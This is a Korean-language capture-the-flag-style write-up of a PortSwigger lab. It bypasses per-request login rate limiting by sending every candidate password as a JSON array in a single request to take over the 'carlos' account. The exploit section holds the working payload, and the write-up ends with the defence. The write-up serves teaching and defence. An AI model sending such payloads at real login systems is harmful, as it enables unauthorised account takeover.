+++
date = '2026-07-11T09:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Broken brute-force protection, multiple credentials per request'
summary = "로그인 요청의 password 필드에 JSON 배열로 후보 전체를 한 번에 실어, 요청당 1회로 세는 rate limit을 우회하고 단일 요청으로 계정을 탈취하는 Authentication 풀이"
toc = true
tags = ["Authentication", "Brute Force", "Rate Limiting", "PortSwigger", "Expert"]
+++

---

## 문제 분석

> **난이도**: `EXPERT`  
> **Lab**: [Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)

> ![image.png](/writeup/portswigger/authentication/13/1.png)

이 랩은 브루트포스 방어 로직 결함에 취약하다. `carlos`의 비밀번호를 브루트포스해 계정 페이지에 접근하면 문제가 해결된다. 피해자 계정은 `carlos`이며 [password 후보](https://portswigger.net/web-security/authentication/auth-lab-passwords)가 주어진다.

### Authentication 진단

로그인 요청을 살펴보면 자격증명을 **JSON**으로 전달한다.

```http
POST /login HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/json

{"username":"carlos","password":"x"}
```

3회 이상 실패하면 `You have made too many incorrect login attempts. Please try again in 1 minute(s).`가 반환된다. 이 상태에서 `X-Forwarded-For` 헤더나 username 변경으로는 차단이 풀리지 않는다.

그런데 JSON은 값으로 배열을 담을 수 있다. `password` 필드에 값을 **여러 개** 넣어 보내도 서버 오류 없이 `Invalid username or password.`가 반환된다 — 서버가 배열을 받아 각 원소를 비밀번호로 검증하는 것으로 보인다. 그러면서 rate limit은 이 요청을 **1회**로만 센다. 요청 하나에 후보를 전부 실으면 카운터를 건드리지 않고 전수 대입이 가능하다.

---

## 익스플로잇

`password` 필드에 후보 목록 전체를 배열로 담아 단일 로그인 요청을 구성한다.

```json
{
"username":"carlos",
"password":[
  "123456",
  "password",
  "12345678",
  "qwerty",
  "123456789",
  "12345",
  "1234",
  "111111",
  "1234567",
  "dragon",
  "123123",
  "baseball",
  "abc123",
  "football",
  "monkey",
  "letmein",
  "shadow",
  "master",
  "666666",
  "qwertyuiop",
  "123321",
  "mustang",
  "michelle",
  "..."
]}
```

(지면상 일부만 표기했으며, 실제로는 제공된 password 후보 전체를 배열에 넣는다.)

이 본문을 담아 로그인 요청을 한 번 보내면, 서버가 배열의 원소 중 `carlos`의 실제 비밀번호를 만나는 순간 인증에 성공해 세션을 내려준다. 그 세션으로 계정 페이지에 접근하면 문제가 해결된다.

![image.png](/writeup/portswigger/authentication/13/2.png)

---

## 정리

이 랩의 결함은 방어가 **"요청 수"를 세면서 "시도 수"를 세지 않는다**는 데 있다. rate limit은 "요청 1건 = 시도 1회"라는 암묵적 가정 위에 서 있는데, JSON 배열은 요청 하나에 시도 수백 개를 담을 수 있어 그 가정을 깬다. 카운터는 3에 도달하지 못하지만 실제 검증은 후보 전체에 대해 이뤄진다. [IP block](/write-up/portswigger/authentication/write-up-portswigger---broken-brute-force-protection-ip-block/) 랩이 "성공으로 카운터를 리셋"해 우회했다면, 이쪽은 애초에 카운터를 거의 증가시키지 않고 우회한다.

핵심은 자료 구조가 방어의 가정을 흔들 수 있다는 점이다. 서버가 `password`를 배열로 받아 반복 검증하도록 관대하게 구현한 것 자체가 결함이고, 여기에 요청 단위 rate limit이 겹쳐 취약점이 완성됐다. 방어는 두 방향이다. 입력을 엄격히 검증해 `password`가 단일 문자열이 아니면 거부하고(스키마 검증), rate limit은 요청 수가 아니라 **실제 자격증명 검증 횟수**를 기준으로 계정 단위에서 센다.

진단에서 남는 습관은, rate limit을 만나면 "차단 후 우회"와 "차단 전 리셋"뿐 아니라 **"한 요청에 여러 시도를 담을 수 있는가"**까지 본다는 것이다. JSON·배열·중복 파라미터처럼 요청 하나에 다수의 값을 실을 수 있는 지점이 있으면, 방어의 계수 단위와 검증 단위가 어긋나는지 확인한다.
